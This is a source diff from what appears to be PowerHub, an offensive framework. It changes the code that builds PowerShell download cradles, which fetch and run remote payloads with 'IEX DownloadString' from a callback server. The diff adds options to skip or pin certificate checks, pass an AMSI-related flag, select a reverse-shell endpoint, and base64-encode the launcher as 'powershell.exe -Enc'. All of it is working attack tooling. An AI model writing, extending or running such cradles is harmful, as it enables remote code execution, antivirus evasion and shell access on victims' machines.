@@ -1,6 +1,7 @@
 from powerhub.args import args
 from powerhub.directories import BASE_DIR, MOD_DIR
 import os
+import binascii
 
 
 def import_module_type(mod_type, filter=lambda x: True):
@@ -85,12 +86,18 @@ class Module(object):
 
 modules = import_modules()
 
-callback_url = '%s://%s:%d/%s' % (
-    args.PROTOCOL,
-    args.URI_HOST,
-    args.URI_PORT,
-    args.URI_PATH+'/' if args.URI_PATH else '',
-)
+callback_urls = {
+    'http': 'http://%s:%d/%s' % (
+        args.URI_HOST,
+        args.URI_PORT if args.URI_PORT else args.LPORT,
+        args.URI_PATH+'/' if args.URI_PATH else '',
+    ),
+    'https': 'https://%s:%d/%s' % (
+        args.URI_HOST,
+        args.URI_PORT if args.URI_PORT else args.SSL_PORT,
+        args.URI_PATH+'/' if args.URI_PATH else '',
+    ),
+}
 
 # TODO consider https
 webdav_url = 'http://%s:%d/webdav' % (
@@ -98,32 +105,54 @@ webdav_url = 'http://%s:%d/webdav' % (
     args.LPORT,
 )
 
-ssl_tls12 = (
-    "[Net.ServicePointManager]::SecurityProtocol="
-    "[Net.SecurityProtocolType]::Tls12;"
-)
-
 endpoints = {
-    'hub': "0",
-    'reverse_shell': "0?r",
+    'hub': "h",
+    'reverse_shell': "r",
 }
 
 
-def stager_str(flavor='hub',
-               need_proxy=True,
-               need_tlsv12=(args.SSL_KEY is not None)):
+def build_cradle(get_args, flavor="hub"):
     result = ""
-    if args.SSL_KEY:
-        result += ("[System.Net.ServicePointManager]::ServerCertificate"
-                   "ValidationCallback={$true};")
-        if need_tlsv12:
+    from powerhub.tools import FINGERPRINT
+    if get_args['GroupTransport'] == 'https':
+        if get_args['RadioNoVerification'] == 'true':
+            result += ("[System.Net.ServicePointManager]::ServerCertificate"
+                       "ValidationCallback={$true};")
+        elif get_args['RadioFingerprint'] == 'true':
+            result += ("[System.Net.ServicePointManager]::ServerCertificate"
+                       "ValidationCallback={param($1,$2);"
+                       "$2.Thumbprint -eq \"%s\"};" %
+                       FINGERPRINT.replace(':', ''))
+        elif get_args['RadioCertStore'] == 'true':
+            pass
+        if get_args['CheckboxTLS1.2'] == 'true':
             result += ("[Net.ServicePointManager]::SecurityProtocol="
                        "[Net.SecurityProtocolType]::Tls12;")
-    result += "$K=new-object net.webclient;"
-    if need_proxy:
-        result += ("$K.proxy=[Net.WebRequest]::GetSystemWebProxy();"
-                   "$K.Proxy.Credentials=[Net.CredentialCache]::"
-                   "DefaultCredentials;")
 
-    result += "IEX $K.downloadstring('%s%s');"
-    return result % (callback_url, endpoints[flavor])
+    if get_args['GroupTransport'].startswith('http'):
+        result += "$K=New-Object Net.WebClient;"
+        if get_args['CheckboxProxy'] == 'true':
+            result += ("$K.Proxy=[Net.WebRequest]::GetSystemWebProxy();"
+                       "$K.Proxy.Credentials=[Net.CredentialCache]::"
+                       "DefaultCredentials;")
+        if not get_args['GroupClipExec'] == 'none':
+            clip_exec = "&c=%s" % get_args['GroupClipExec']
+        else:
+            clip_exec = ""
+        result += "IEX $K.DownloadString(\"%s0?t=%s&f=%s&a=%s%s\");"
+        result = result % (
+            callback_urls[get_args['GroupTransport']],
+            get_args['GroupTransport'],
+            endpoints[flavor],
+            get_args['GroupAmsi'],
+            clip_exec,
+        )
+
+    if get_args['GroupLauncher'] == 'cmd':
+        result = result.replace('"', '\\"')
+        result = 'powershell.exe "%s"' % result
+    elif get_args['GroupLauncher'] == 'cmd_enc':
+        result = 'powershell.exe -Enc %s' % \
+            binascii.b2a_base64(result.encode('utf-16le')).decode()
+
+    return result
